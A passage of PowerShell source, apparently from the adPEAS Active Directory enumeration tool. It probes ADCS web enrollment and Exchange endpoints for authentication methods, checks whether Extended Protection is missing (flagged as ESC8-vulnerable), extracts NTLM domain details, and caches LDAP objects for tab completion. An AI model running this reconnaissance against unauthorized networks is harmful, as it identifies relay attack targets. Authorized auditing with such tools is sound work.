	                        if ($redirectOWAVersion -and -not $endpointResult.OWAVersion) {
	                            $endpointResult.OWAVersion = $redirectOWAVersion
	                        }
	                        try { $redirectEx.Response.Close() } catch { }
	                        try { $redirectEx.Response.Dispose() } catch { }
	                    }
	                }
	            }
	            catch {
	            }
	        }
	    }
	    else {
	        $endpointResult.IsExchangeEndpoint = $true
	        $wwwAuth = $response.Headers['WWW-Authenticate']
	        if ($wwwAuth) {
	            $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $wwwAuth
	        }
	    }
	}
	catch [System.Net.WebException] {
	    $webEx = $_.Exception
	    try {
	        if ($webEx.Response) {
	            $statusCode = [int]$webEx.Response.StatusCode
	            $endpointResult.StatusCode = $statusCode
	            if ($statusCode -in @(401, 403, 440)) {
	                $endpointResult.Reachable = $true
	                $endpointResult.IsExchangeEndpoint = $true
	                $wwwAuth = $webEx.Response.Headers['WWW-Authenticate']
	                if ($wwwAuth) {
	                    $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $wwwAuth
	                }
	                $endpointResult.ServerHeader = $webEx.Response.Headers['Server']
	                $endpointResult.OWAVersion = $webEx.Response.Headers['X-OWA-Version']
	            }
	            elseif ($statusCode -eq 404) {
	                $endpointResult.Reachable = $true
	                $endpointResult.IsExchangeEndpoint = $false
	                $endpointResult.ServerHeader = $webEx.Response.Headers['Server']
	            }
	            elseif ($statusCode -in @(500, 502, 503)) {
	                $endpointResult.Reachable = $true
	                $endpointResult.IsExchangeEndpoint = $false
	                $endpointResult.ServerHeader = $webEx.Response.Headers['Server']
	            }
	            elseif ($statusCode -in @(301, 302)) {
	                $endpointResult.Reachable = $true
	                $location = $webEx.Response.Headers['Location']
	                $endpointResult.RedirectLocation = $location
	                $endpointResult.ServerHeader = $webEx.Response.Headers['Server']
	                $endpointResult.OWAVersion = $webEx.Response.Headers['X-OWA-Version']
	                $isExchangeRedirect = $false
	                if ($location) {
	                    foreach ($pattern in $exchangeRedirectPatterns) {
	                        if ($location.ToLower().Contains($pattern.ToLower())) {
	                            $isExchangeRedirect = $true
	                            break
	                        }
	                    }
	                    if (-not $isExchangeRedirect) {
	                    }
	                }
	                else {
	                }
	                $endpointResult.IsExchangeEndpoint = $isExchangeRedirect
	                if ($isExchangeRedirect -and $location) {
	                    $wwwAuth = $webEx.Response.Headers['WWW-Authenticate']
	                    if ($wwwAuth) {
	                        $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $wwwAuth
	                    }
	                    else {
	                        try {
	                            $redirectUrl = $location
	                            if ($location -match '^/') {
	                                $uri = [System.Uri]$Url
	                                $redirectUrl = "$($uri.Scheme)://$($uri.Host)$location"
	                            }
	                            $redirectRequest = [System.Net.HttpWebRequest]::Create($redirectUrl)
	                            $redirectRequest.Method = 'GET'
	                            $redirectRequest.Timeout = $TimeoutSeconds * 1000
	                            $redirectRequest.ReadWriteTimeout = $TimeoutSeconds * 1000
	                            $redirectRequest.UserAgent = $UserAgent
	                            $redirectRequest.AllowAutoRedirect = $false
	                            try {
	                                $redirectResponse = $redirectRequest.GetResponse()
	                                if ($redirectResponse) {
	                                    try { $redirectResponse.Close() } catch { }
	                                    try { $redirectResponse.Dispose() } catch { }
	                                }
	                            }
	                            catch [System.Net.WebException] {
	                                $redirectEx = $_.Exception
	                                if ($redirectEx.Response) {
	                                    $redirectAuth = $redirectEx.Response.Headers['WWW-Authenticate']
	                                    if ($redirectAuth) {
	                                        $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $redirectAuth
	                                    }
	                                    try { $redirectEx.Response.Close() } catch { }
	                                    try { $redirectEx.Response.Dispose() } catch { }
	                                }
	                            }
	                        }
	                        catch {
	                        }
	                    }
	                }
	            }
	        }
	    }
	    finally {
	        if ($webEx.Response) {
	            try { $webEx.Response.Close() } catch { }
	            try { $webEx.Response.Dispose() } catch { }
	        }
	    }
	}
	catch {
	}
	finally {
	    if ($response) {
	        try { $response.Close() } catch { }
	        try { $response.Dispose() } catch { }
	    }
	}
	return $endpointResult
}
function Invoke-ADCSScanInternal {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory = $true)]
	    [string]$Hostname,
	    [Parameter(Mandatory = $false)]
	    [int]$TimeoutSeconds = 5,
	    [Parameter(Mandatory = $false)]
	    [string]$UserAgent,
	    [Parameter(Mandatory = $false)]
	    [string]$CAName,
	    [Parameter(Mandatory = $false)]
	    [switch]$TestEPA
	)
	$targetHost = $Hostname -replace '^https?://', ''  # Remove protocol
	$targetHost = $targetHost -replace '/.*$', ''       # Remove path and everything after first /
	$targetHost = $targetHost -replace ':\d+$', ''      # Remove port number
	$targetHost = $targetHost.Trim()
	$result = [PSCustomObject]@{
	    Success          = $false
	    Hostname         = $targetHost  # Return normalized hostname (FQDN only)
	    HttpAvailable    = $false
	    HttpsAvailable   = $false
	    HttpStatusCode   = $null
	    HttpsStatusCode  = $null
	    ServerHeader     = $null
	    Endpoints        = [PSCustomObject]@{
	        CertSrv      = [PSCustomObject]@{ Available = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }  # /certsrv/
	        CEP          = [PSCustomObject]@{ Available = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }  # /ADPolicyProvider_CEP_*/
	        CES          = [PSCustomObject]@{ Available = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }  # /<CAName>_CES_*/
	        NDES         = [PSCustomObject]@{ Available = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }  # /CertSrv/mscep/
	    }
	    EPAEnabled       = $null         # $true = EPA active (secure), $false = EPA not active (ESC8 vulnerable), $null = not tested
	    EPAConfidence    = $null         # "High", "Medium", "Low", "Unknown"
	    EPADiagnostic    = $null         # Diagnostic info for EPA test
	    NTLMInfo         = $null         # PSCustomObject with NTLM details from first successful EPA test
	    Error            = $null
	}
	if ([string]::IsNullOrWhiteSpace($targetHost)) {
	    $result.Error = "Invalid or empty hostname"
	    return $result
	}
	$sanitizedCAName = $null
	if ($CAName) {
	    if ($CAName -match '[/\\%<>"|?*:]' -or $CAName -match '\.\.') {
	        $sanitizedCAName = $null
	    }
	    else {
	        $sanitizedCAName = [System.Uri]::EscapeDataString($CAName)
	    }
	}
	$serverReachable = $false
	$httpsUrl = "https://$targetHost/certsrv/"
	$httpsResult = Test-ADCSEndpoint -Url $httpsUrl -EndpointName "CertSrv" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	if ($httpsResult.Reachable) {
	    $serverReachable = $true
	}
	if ($httpsResult.IsADCSEndpoint) {
	    $result.HttpsAvailable = $true
	    $result.HttpsStatusCode = $httpsResult.StatusCode
	    $result.Success = $true
	    $result.Endpoints.CertSrv.Available = $true
	    $result.Endpoints.CertSrv.AuthMethods = $httpsResult.AuthMethods -join ', '
	    if ($httpsResult.ServerHeader) {
	        $result.ServerHeader = $httpsResult.ServerHeader
	    }
	}
	elseif ($httpsResult.Reachable) {
	}
	$httpUrl = "http://$targetHost/certsrv/"
	$httpResult = Test-ADCSEndpoint -Url $httpUrl -EndpointName "CertSrv" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	if ($httpResult.Reachable) {
	    $serverReachable = $true
	}
	if ($httpResult.IsADCSEndpoint) {
	    $result.HttpAvailable = $true
	    $result.HttpStatusCode = $httpResult.StatusCode
	    $result.Success = $true
	    $result.Endpoints.CertSrv.Available = $true
	    if ([string]::IsNullOrEmpty($result.Endpoints.CertSrv.AuthMethods) -and $httpResult.AuthMethods.Count -gt 0) {
	        $result.Endpoints.CertSrv.AuthMethods = $httpResult.AuthMethods -join ', '
	    }
	    if (-not $result.ServerHeader -and $httpResult.ServerHeader) {
	        $result.ServerHeader = $httpResult.ServerHeader
	    }
	}
	elseif ($httpResult.Reachable) {
	}
	if ($serverReachable) {
	    $cepUrl = "https://$targetHost/ADPolicyProvider_CEP_Kerberos/service.svc"
	    $cepResult = Test-ADCSEndpoint -Url $cepUrl -EndpointName "CEP" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	    if ($cepResult.IsADCSEndpoint) {
	        $result.Endpoints.CEP.Available = $true
	        $result.Endpoints.CEP.AuthMethods = $cepResult.AuthMethods -join ', '
	        $result.Success = $true
	    }
	    elseif ($cepResult.Reachable) {
	    }
	    if ($sanitizedCAName) {
	        $cesUrl = "https://$targetHost/${sanitizedCAName}_CES_Kerberos/service.svc"
	        $cesResult = Test-ADCSEndpoint -Url $cesUrl -EndpointName "CES" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	        if ($cesResult.IsADCSEndpoint) {
	            $result.Endpoints.CES.Available = $true
	            $result.Endpoints.CES.AuthMethods = $cesResult.AuthMethods -join ', '
	            $result.Success = $true
	        }
	        elseif ($cesResult.Reachable) {
	        }
	    } else {
	    }
	    $ndesUrl = "https://$targetHost/CertSrv/mscep/"
	    $ndesResult = Test-ADCSEndpoint -Url $ndesUrl -EndpointName "NDES" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	    if ($ndesResult.IsADCSEndpoint) {
	        $result.Endpoints.NDES.Available = $true
	        $result.Endpoints.NDES.AuthMethods = $ndesResult.AuthMethods -join ', '
	        $result.Success = $true
	    }
	    elseif ($ndesResult.Reachable) {
	    }
	    if (-not $result.Endpoints.NDES.Available) {
	        $ndesHttpUrl = "http://$targetHost/CertSrv/mscep/"
	        $ndesHttpResult = Test-ADCSEndpoint -Url $ndesHttpUrl -EndpointName "NDES" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	        if ($ndesHttpResult.IsADCSEndpoint) {
	            $result.Endpoints.NDES.Available = $true
	            $result.Endpoints.NDES.AuthMethods = $ndesHttpResult.AuthMethods -join ', '
	            $result.Success = $true
	        }
	    }
	} else {
	}
	if (-not $result.Success) {
	    $result.Error = "No ADCS web enrollment endpoints found (server may be offline or not running ADCS web services)"
	}
	$availableEndpoints = @()
	foreach ($ep in @('CertSrv', 'CEP', 'CES', 'NDES')) {
	    if ($result.Endpoints.$ep.Available) {
	        $authStr = if ($result.Endpoints.$ep.AuthMethods) { " ($($result.Endpoints.$ep.AuthMethods))" } else { "" }
	        $availableEndpoints += "$ep$authStr"
	    }
	}
	if ($availableEndpoints.Count -gt 0) {
	} else {
	}
	if ($TestEPA -and $result.Success) {
	    $epaTimeout = [Math]::Max($TimeoutSeconds, 10)
	    $legacyEPASet = $false
	    foreach ($ep in @('CertSrv', 'CEP', 'CES', 'NDES')) {
	        if ($result.Endpoints.$ep.Available -and $result.Endpoints.$ep.AuthMethods -match 'NTLM') {
	            $epaTestUrl = switch ($ep) {
	                'CertSrv' { "https://$targetHost/certsrv/" }
	                'CEP' { "https://$targetHost/ADPolicyProvider_CEP_Kerberos/service.svc" }
	                'CES' {
	                    if ($sanitizedCAName) {
	                        "https://$targetHost/${sanitizedCAName}_CES_Kerberos/service.svc"
	                    } else {
	                        $null  # Cannot construct CES URL without validated CA name
	                    }
	                }
	                'NDES' { "https://$targetHost/CertSrv/mscep/" }
	            }
	            if (-not $epaTestUrl) {
	                continue
	            }
	            $epaResult = Test-ExtendedProtection -Url $epaTestUrl -TimeoutSeconds $epaTimeout -UserAgent $UserAgent
	            $result.Endpoints.$ep.EPAEnabled = $epaResult.EPAEnabled
	            $result.Endpoints.$ep.EPAConfidence = $epaResult.Confidence
	            if ($epaResult.Success) {
	                if ($epaResult.EPAEnabled -eq $true) {
	                }
	                elseif ($epaResult.EPAEnabled -eq $false) {
	                }
	                else {
	                }
	            }
	            else {
	            }
	            if (-not $legacyEPASet) {
	                $result.EPAEnabled = $epaResult.EPAEnabled
	                $result.EPAConfidence = $epaResult.Confidence
	                $result.EPADiagnostic = $epaResult.DiagnosticInfo
	                if ($epaResult.Type2Received) {
	                    $result.NTLMInfo = [PSCustomObject]@{
	                        NbComputerName  = $epaResult.NbComputerName      # NetBIOS computer name
	                        NbDomainName    = $epaResult.NbDomainName        # NetBIOS domain name
	                        DnsComputerName = $epaResult.DnsComputerName     # DNS computer name (FQDN)
	                        DnsDomainName   = $epaResult.DnsDomainName       # DNS domain name
	                        DnsTreeName     = $epaResult.DnsTreeName         # DNS forest name
	                        ServerTimestamp = $epaResult.ServerTimestamp     # Server time (DateTime)
	                        NTLMChallenge   = $epaResult.NTLMChallenge       # NTLM challenge (hex)
	                        SourceEndpoint  = $ep                            # Which endpoint provided this info
	                    }
	                }
	                $legacyEPASet = $true
	            }
	        }
	    }
	    if (-not $legacyEPASet) {
	        if (-not $result.HttpsAvailable) {
	            $result.EPAEnabled = $false
	            $result.EPAConfidence = "High"
	            $result.EPADiagnostic = "HTTP only - no TLS channel for EPA to bind to"
	        }
	        else {
	            $result.EPADiagnostic = "NTLM not offered over HTTPS - EPA test not applicable"
	        }
	    }
	}
	return $result
}
function Test-ADCSEndpoint {
	[CmdletBinding()]
	param(
	    [string]$Url,
	    [string]$EndpointName = "ADCS",
	    [int]$TimeoutSeconds,
	    [string]$UserAgent
	)
	$endpointResult = [PSCustomObject]@{
	    Reachable        = $false      # Server responded (any HTTP response)
	    IsADCSEndpoint   = $false      # Confirmed to be ADCS (not a load balancer redirect)
	    StatusCode       = $null
	    AuthMethods      = @()
	    ServerHeader     = $null
	    RedirectLocation = $null       # For debugging redirect issues
	}
	if ([string]::IsNullOrWhiteSpace($Url)) {
	    return $endpointResult
	}
	$response = $null
	$adcsRedirectPatterns = $Script:ADCSRedirectPatterns
	try {
	    $request = [System.Net.HttpWebRequest]::Create($Url)
	    $request.Method = 'GET'
	    $request.Timeout = $TimeoutSeconds * 1000
	    $request.ReadWriteTimeout = $TimeoutSeconds * 1000
	    $request.UserAgent = $UserAgent
	    $request.AllowAutoRedirect = $false  # Don't follow redirects to capture auth headers
	    $response = $request.GetResponse()
	    $statusCode = [int]$response.StatusCode
	    $endpointResult.Reachable = $true
	    $endpointResult.StatusCode = $statusCode
	    $endpointResult.ServerHeader = $response.Headers['Server']
	    if ($statusCode -in @(301, 302)) {
	        $location = $response.Headers['Location']
	        $endpointResult.RedirectLocation = $location
	        $isADCSRedirect = $false
	        if ($location) {
	            foreach ($pattern in $adcsRedirectPatterns) {
	                if ($location.ToLower().Contains($pattern.ToLower())) {
	                    $isADCSRedirect = $true
	                    break
	                }
	            }
	            if (-not $isADCSRedirect) {
	            }
	        }
	        $endpointResult.IsADCSEndpoint = $isADCSRedirect
	    }
	    else {
	        $endpointResult.IsADCSEndpoint = $true
	        $wwwAuth = $response.Headers['WWW-Authenticate']
	        if ($wwwAuth) {
	            $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $wwwAuth
	        }
	    }
	}
	catch [System.Net.WebException] {
	    $webEx = $_.Exception
	    try {
	        if ($webEx.Response) {
	            $statusCode = [int]$webEx.Response.StatusCode
	            $endpointResult.StatusCode = $statusCode
	            if ($statusCode -in @(401, 403)) {
	                $endpointResult.Reachable = $true
	                $wwwAuth = $webEx.Response.Headers['WWW-Authenticate']
	                if ($wwwAuth) {
	                    $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $wwwAuth
	                    $endpointResult.IsADCSEndpoint = $true
	                }
	                elseif ($statusCode -eq 403 -and $Url -notmatch '^https://') {
	                    $endpointResult.IsADCSEndpoint = $false
	                }
	                else {
	                    $endpointResult.IsADCSEndpoint = $true
	                }
	                $endpointResult.ServerHeader = $webEx.Response.Headers['Server']
	            }
	            elseif ($statusCode -eq 404) {
	                $endpointResult.Reachable = $true
	                $endpointResult.IsADCSEndpoint = $false
	                $endpointResult.ServerHeader = $webEx.Response.Headers['Server']
	            }
	            elseif ($statusCode -in @(500, 502, 503)) {
	                $endpointResult.Reachable = $true
	                $endpointResult.IsADCSEndpoint = $false
	                $endpointResult.ServerHeader = $webEx.Response.Headers['Server']
	            }
	            elseif ($statusCode -in @(301, 302)) {
	                $endpointResult.Reachable = $true
	                $location = $webEx.Response.Headers['Location']
	                $endpointResult.RedirectLocation = $location
	                $endpointResult.ServerHeader = $webEx.Response.Headers['Server']
	                $isADCSRedirect = $false
	                if ($location) {
	                    foreach ($pattern in $adcsRedirectPatterns) {
	                        if ($location.ToLower().Contains($pattern.ToLower())) {
	                            $isADCSRedirect = $true
	                            break
	                        }
	                    }
	                    if (-not $isADCSRedirect) {
	                    }
	                }
	                $endpointResult.IsADCSEndpoint = $isADCSRedirect
	                if ($isADCSRedirect -and $location) {
	                    $wwwAuth = $webEx.Response.Headers['WWW-Authenticate']
	                    if ($wwwAuth) {
	                        $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $wwwAuth
	                    }
	                }
	            }
	        }
	    }
	    finally {
	        if ($webEx.Response) {
	            try { $webEx.Response.Close() } catch { }
	            try { $webEx.Response.Dispose() } catch { }
	        }
	    }
	}
	catch {
	}
	finally {
	    if ($response) {
	        try { $response.Close() } catch { }
	        try { $response.Dispose() } catch { }
	    }
	}
	return $endpointResult
}
function Parse-WWWAuthenticateHeader {
	[CmdletBinding()]
	param(
	    [string]$HeaderValue
	)
	$authMethods = @()
	if ([string]::IsNullOrWhiteSpace($HeaderValue)) {
	    return $authMethods
	}
	$knownSchemes = @('Negotiate', 'NTLM', 'Basic', 'Digest', 'Kerberos', 'Bearer')
	foreach ($scheme in $knownSchemes) {
	    if ($HeaderValue -imatch "(?:^|[\s,])$scheme(?:\s+[A-Za-z0-9+/=]+)?(?:[\s,]|$)") {
	        $authMethods += $scheme
	    }
	    elseif ($HeaderValue -imatch "(?:^|[\s,])$scheme\s+[A-Za-z0-9+/]{10,}") {
	        $authMethods += $scheme
	    }
	}
	if ($authMethods.Count -eq 0 -and $HeaderValue.Length -gt 0) {
	}
	return $authMethods | Select-Object -Unique
}
if (-not $Script:CompletionCache) {
	$Script:CompletionCache = @{
	    Users     = @()
	    Computers = @()
	    Groups    = @()
	    GPOs      = @()
	    Templates = @()
	}
}
if (-not $Script:CompletionCacheAttempted) {
	$Script:CompletionCacheAttempted = @{
	    Users     = $false
	    Computers = $false
	    Groups    = $false
	    GPOs      = $false
	    Templates = $false
	}
}
function Build-CompletionCache {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory = $false)]
	    [ValidateSet('Users', 'Computers', 'Groups', 'GPOs', 'Templates', 'All')]
	    [string[]]$ObjectTypes = @('All')
	)
	process {
	    if (-not $Script:LdapConnection) {
	        Write-Warning "[Build-CompletionCache] No active LDAP connection. Use Connect-adPEAS first."
	        return
	    }
	    $buildAll = $ObjectTypes -contains 'All'
	    if ($buildAll -or $ObjectTypes -contains 'Users') {
	        try {
	            $Script:CompletionCache.Users = @(
	                Get-DomainUser -Properties @('sAMAccountName') |
	                Where-Object { $_.sAMAccountName } |
	                Select-Object -ExpandProperty sAMAccountName |
	                Sort-Object
	            )
	        }
	        catch {
	            $Script:CompletionCache.Users = @()
	        }
	    }
	    if ($buildAll -or $ObjectTypes -contains 'Computers') {
	        try {
	            $Script:CompletionCache.Computers = @(
	                Get-DomainComputer -Properties @('sAMAccountName') |
	                Where-Object { $_.sAMAccountName } |
	                Select-Object -ExpandProperty sAMAccountName |
	                ForEach-Object { $_ -replace '\$$', '' } |  # Remove trailing $ from computer accounts
	                Sort-Object
	            )
	        }
	        catch {
	            $Script:CompletionCache.Computers = @()
	        }
	    }
	    if ($buildAll -or $ObjectTypes -contains 'Groups') {
	        try {
	            $Script:CompletionCache.Groups = @(
	                Get-DomainGroup -Properties @('sAMAccountName') |
	                Where-Object { $_.sAMAccountName } |
	                Select-Object -ExpandProperty sAMAccountName |
	                Sort-Object
	            )
	        }
	        catch {
	            $Script:CompletionCache.Groups = @()
	        }
	    }
	    if ($buildAll -or $ObjectTypes -contains 'GPOs') {
	        try {
	            $Script:CompletionCache.GPOs = @(
	                Get-DomainGPO -Properties @('displayName') |
	                Where-Object { $_.displayName } |
	                Select-Object -ExpandProperty displayName |
	                Sort-Object
	            )
	        }
	        catch {
	            $Script:CompletionCache.GPOs = @()
	        }
	    }
	    if ($buildAll -or $ObjectTypes -contains 'Templates') {
	        try {
	            $Script:CompletionCache.Templates = @(
	                Get-CertificateAuthority |
	                Where-Object { -not $_._QueryError -and $_.CertificateTemplates } |
	                ForEach-Object { $_.CertificateTemplates } |
	                Sort-Object -Unique
	            )
	            $Script:CompletionCacheAttempted.Templates = $true
	        }
	        catch {
	            $Script:CompletionCache.Templates = @()
	            $Script:CompletionCacheAttempted.Templates = $true
	        }
	    }
	    $totalCached = $Script:CompletionCache.Users.Count +
	                   $Script:CompletionCache.Computers.Count +
	                   $Script:CompletionCache.Groups.Count +
	                   $Script:CompletionCache.GPOs.Count +
	                   $Script:CompletionCache.Templates.Count
	}
}
function Clear-CompletionCache {
	[CmdletBinding()]
	param()
	process {
	    $Script:CompletionCache = @{
	        Users     = @()
	        Computers = @()
	        Groups    = @()
	        GPOs      = @()
	        Templates = @()
	    }
	    $Script:CompletionCacheAttempted = @{
	        Users     = $false
	        Computers = $false
	        Groups    = $false
	        GPOs      = $false
	        Templates = $false
	    }
	}
}
function Get-CompletionCacheStats {
	[CmdletBinding()]
	param()
	process {
	    [PSCustomObject]@{
	        Users     = $Script:CompletionCache.Users.Count
	        Computers = $Script:CompletionCache.Computers.Count
	        Groups    = $Script:CompletionCache.Groups.Count
	        GPOs      = $Script:CompletionCache.GPOs.Count
	        Templates = $Script:CompletionCache.Templates.Count
	        Total     = ($Script:CompletionCache.Users.Count +
	                    $Script:CompletionCache.Computers.Count +
	                    $Script:CompletionCache.Groups.Count +
	                    $Script:CompletionCache.GPOs.Count +
	                    $Script:CompletionCache.Templates.Count)
	        CacheExists = ($Script:CompletionCache.Users.Count -gt 0 -or
	                      $Script:CompletionCache.Computers.Count -gt 0 -or
	                      $Script:CompletionCache.Groups.Count -gt 0 -or
	                      $Script:CompletionCache.GPOs.Count -gt 0 -or
	                      $Script:CompletionCache.Templates.Count -gt 0)
	    }
	}
}
function Get-adPEASCompletionState {
	[CmdletBinding()]
	param([string]$ObjectType)
	return @{
	    HasConnection = ($null -ne $Script:LdapConnection)
	    Cache = $Script:CompletionCache
	    CacheAttempted = $Script:CompletionCacheAttempted
	}
}
Register-ArgumentCompleter -CommandName Get-DomainUser -ParameterName Identity -ScriptBlock {
	param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameters)
	$state = Get-adPEASCompletionState -ObjectType 'Users'
	if ($state.HasConnection -and
	    (-not $state.Cache -or $state.Cache.Users.Count -eq 0) -and
	    (-not $state.CacheAttempted -or -not $state.CacheAttempted.Users)) {
	    Build-CompletionCache -ObjectTypes @('Users')
	    $state = Get-adPEASCompletionState -ObjectType 'Users'
	}
	if ($state.Cache -and $state.Cache.Users -and $state.Cache.Users.Count -gt 0) {
	    $state.Cache.Users | Where-Object {
	        $_ -like "$wordToComplete*"
	    } | Select-Object -First 50 | ForEach-Object {
	        $completionText = if ($_ -match "[\s'`"`$``]") {
	            '"' + ($_ -replace '"', '""') + '"'
	        } else { $_ }
	        [System.Management.Automation.CompletionResult]::new(
	            $completionText,
	            $_,
	            'ParameterValue',
	            "User: $_"
	        )
	    }
	}
}
